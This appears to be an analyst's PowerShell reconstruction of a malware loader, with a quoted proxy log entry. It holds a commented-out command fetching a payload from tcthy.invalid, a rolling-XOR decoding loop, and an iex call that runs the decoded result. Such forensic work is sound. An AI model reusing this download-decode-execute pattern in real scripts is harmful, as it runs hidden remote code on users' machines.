#$bytes = (New-Object Net.WebClient).DownloadData('http://tcthy.invalid/chairman')

$bytes = ""


$prev = [byte] 173

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
        $prev = $bytes[$i] -bxor $prev
        $prev
    })

iex([System.Text.Encoding]::UTF8.GetString($dec))


##look at proxy 
<#
2021-03-16 08:03:21 42 10.58.121.64 200 TCP_MISS 12734 479 GET http tcthy.invalid chairman - - DIRECT 172.22.10.203 application/octet-stream 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko' PROXIED none - 10.58.121.11 SG-HTTP-Service - none -
#>